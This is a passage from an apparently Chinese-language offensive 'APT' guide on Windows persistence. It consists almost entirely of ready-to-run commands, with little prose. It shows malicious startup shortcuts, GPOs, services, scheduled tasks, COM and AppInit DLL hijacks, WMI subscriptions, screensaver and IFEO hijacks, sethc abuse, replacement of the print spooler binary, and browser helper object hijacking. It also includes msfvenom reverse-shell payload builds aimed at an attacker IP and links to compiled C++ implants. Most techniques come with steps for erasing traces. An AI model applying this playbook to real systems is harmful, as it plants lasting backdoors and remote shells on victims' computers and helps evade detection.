$Shortcut = $WScriptShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MaliciousSoftware.lnk")
$Shortcut.TargetPath = "C:\Path\To\Malware.exe"
$Shortcut.Save()
```

4、组策略持久化

[gpedit.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/gpedit.cpp)

```powershell
# 使用PowerShell配置组策略启动脚本
$GPO = New-Object -ComObject GPMgmt.GPM
$GPDomain = $GPO.GetDomain("domain.local", "", $null, $null)
$GPO = $GPDomain.CreateGPO("MaliciousGPO")
$GPO.SetSecurityDescriptor("O:BAG:BAD:(A;;GA;;;BA)")
$GPO.SetStartupScript("C:\Path\To\Malware.bat")
```

### 服务持久化

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f exe > msf.exe
```

[windows_server.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/windows_server.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 windows_server.cpp -o windows_server.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```Bash
sc create GhostWolfLab binpath= "C:\Users\snowwolf\Desktop\rat\pre\windows_server.exe" start= auto
sc query GhostWolfLab
sc start GhostWolfLab
sc config ExistingService binPath= "C:\Path\To\Malware.exe"
sc stop 服务名称
sc delete 服务名称
```

### 计划任务持久化

1、使用schtasks命令创建计划任务

```Bash
schtasks /create /tn "Snowwolf" /tr "C:\Path\To\Malware.exe" /sc onlogon /ru SYSTEM
```

2、使用XML配置创建计划任务

```xml
<!-- Task.xml -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>C:\Path\To\Malware.exe</Command>
    </Exec>
  </Actions>
</Task>
```

```Bash
schtasks /create /tn "MaliciousTask" /xml "C:\Path\To\Task.xml" /ru SYSTEM
```

[task.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/task.cpp)

### COM DLL劫持

[com_dll.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/com_dll.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 com_dll.cpp -o com_dll.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```powershell
Set-ItemProperty -Path "HKCR:\CLSID\{CLSID}\InprocServer32" -Name "(default)" -Value "C:\Path\To\Malicious.dll"
reg delete "HKCU\Software\Classes\CLSID\{CLSID}" /f
```

### AppInit_DLLs

[AppInit_DLLs.wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/AppInit_DLLs.wolf.cpp)

```Bash
x86_64-w64-mingw32-gcc -shared -o wolf.dll wolf.cpp -fpermissive
```

[AppInit.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/AppInit.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 AppInit.cpp -o AppInit.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /d 0
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /f
```

### netsh helper DLL

[netsh_dll.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/netsh_dll.cpp)

```Bash
x86_64-w64-mingw32-gcc -shared -o netsh.dll netsh_dll.cpp -fpermissive
```

```Bash
netsh
add helper 恶意DLL路径
```

[netsh_pers.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/netsh_pers.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 netsh_pers.cpp -o netsh_pers.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### WMI事件订阅

wmi.ps1

```powershell
# 创建事件过滤器
$Filter = @{
    Name = 'PersistenceFilter'
    EventNamespace = 'Root\Cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance.Minute = 0"
}
$EventFilter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property $Filter

# 创建事件使用者
$Consumer = @{
    Name = 'PersistenceConsumer'
    CommandLineTemplate = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process notepad.exe"'
}
$EventConsumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $Consumer

# 绑定事件过滤器和事件使用者
$Binding = @{
    Filter = $EventFilter.__PATH
    Consumer = $EventConsumer.__PATH
}
New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property $Binding
```

```Bash
Get-Content wmi.ps1 | PowerShell.exe -noprofile -
```

```powershell
# 移除事件过滤器
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='PersistenceFilter'" | Remove-WmiObject

# 移除事件使用者
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='PersistenceConsumer'" | Remove-WmiObject

# 移除绑定
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter='__EventFilter.Name=\"PersistenceFilter\"' AND Consumer='CommandLineEventConsumer.Name=\"PersistenceConsumer\"'" | Remove-WmiObject
```

### 劫持屏幕保护程序

[desktop.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/desktop.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 desktop.cpp -o desktop.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```Bash
终端命令
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /d 10
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d 恶意可执行程序路径

PowerShell命令
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value '恶意可执行程序路径' -PropertyType String -Force
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive' -Value '1' -PropertyType String -Force
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverTimeout' -Value '60' -PropertyType String -Force

查看当前配置的屏幕保护程序
Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE'

清理痕迹
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'ScreenSaveTimeOut'
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'SCRNSAVE.EXE'
```

### Windows打印后台处理程序服务

[monitor.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/monitor.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 monitor.cpp -o monitor.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lwinspool

msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f dll > print.dll
```

```Bash
reg add "HKLM\System\CurrentControlSet\Control\Print\Monitors\Wolf" /v "Driver" /d "print.dll" /t REG_SZ
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Print\Monitors\Wolf" -Name "Driver"
```

```powershell
Stop-Service -Name Spooler -Force  //停止打印后台处理程序服务
Copy-Item -Path "C:\Windows\System32\spoolsv.exe" -Destination "C:\Windows\System32\spoolsv.exe.bak"  //备份原始的spoolsv.exe文件
Copy-Item -Path "恶意可执行程序" -Destination "C:\Windows\System32\spoolsv.exe" -Force  //替换spoolsv.exe为恶意程序
Start-Service -Name Spooler  //启动打印后台处理程序服务

清理痕迹
Stop-Service -Name Spooler -Force
Copy-Item -Path "C:\Windows\System32\spoolsv.exe.bak" -Destination "C:\Windows\System32\spoolsv.exe" -Force
Start-Service -Name Spooler
```

### 默认文件扩展名劫持

[txt.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/txt.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 txt.cpp -o txt.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions
```

```Bash
reg query "HKCR\txtfile\shell\open\command" /s
reg add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\system32\NOTEPAD.EXE %1"
```

### IFEO

[ifeo.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/ifeo.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 ifeo.cpp -o ifeo.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[ifeo_debug.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/ifeo_debug.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 ifeo_debug.cpp -o ifeo_debug.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```Bash
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe" -Name 'Debugger'
```

### PowerShell配置文件

```powershell
echo $PROFILE
Test-Path -Path $PROFILE
New-Item -Path $PROFILE -ItemType File -Force
Add-Content -Path $PROFILE -Value 'Start-Process "恶意文件路径"'
powershell -executionpolicy bypass
$PROFILE | select *
```

[config_powershell.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/config_powershell.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 config_powershell.cpp -o config_powershell.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### 辅助功能

[sethc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/sethc.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 sethc.cpp -o sethc.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /s
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Force -Verbose
```

### 应用卸载

+ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\[应用名称]
+ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\QuietUninstallString\[应用名称]

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver" /s
```

[uninstall.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/uninstall.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 uninstall.cpp -o uninstall.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```powershell
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver" /v "UninstallString" /t REG_SZ /d "C:\Program Files\WinRAR\uninstall.exe" /f
```

### 事件查看器

[windows_event.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/windows_event.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 windows_event.cpp -o windows_event.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /s
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v "MicrosoftRedirectionUrl" /t REG_SZ /d "http://go.microsoft.com/fwlink/events.asp" /f
```

### IE浏览器劫持

1、浏览器DLL劫持

```Bash
dir /b /s DLL文件名
```

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f dll > suspend.dll
```

2、浏览器辅助对象劫持

```powershell
创建BHO的注册表项
$BHO_GUID = "{12345678-1234-1234-1234-1234567890AB}"
# 恶意DLL路径地址
$BHO_Path = "C:\Users\Administrator\Desktop\test\malicious\pre\wolf.dll"

# 注册BHO
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\$BHO_GUID" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\$BHO_GUID" -Name "Default" -Value "Malicious BHO"

# 注册BHO的CLSID
New-Item -Path "HKEY_CLASSES_ROOT\CLSID\$BHO_GUID" -Force
Set-ItemProperty -Path "HKEY_CLASSES_ROOT\CLSID\$BHO_GUID" -Name "InprocServer32" -Value $BHO_Path
Set-ItemProperty -Path "HKEY_CLASSES_ROOT\CLSID\$BHO_GUID\InprocServer32" -Name "ThreadingModel" -Value "Apartment"
```

```powershell
Get-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\*"
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\注册的BHO_GUID" -Force
Remove-Item -Path "HKCR:\CLSID\注册的BHO_GUID" -Force
```

3、修改启动页面

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "file://恶意可执行程序" /f
reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main" /s
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "about:blank" /f
```

### 网络配置

[edge.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/edge.cpp)

```Bash
x86_64-w64-mingw32-g++ -O2 edge.cpp -o edge.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```
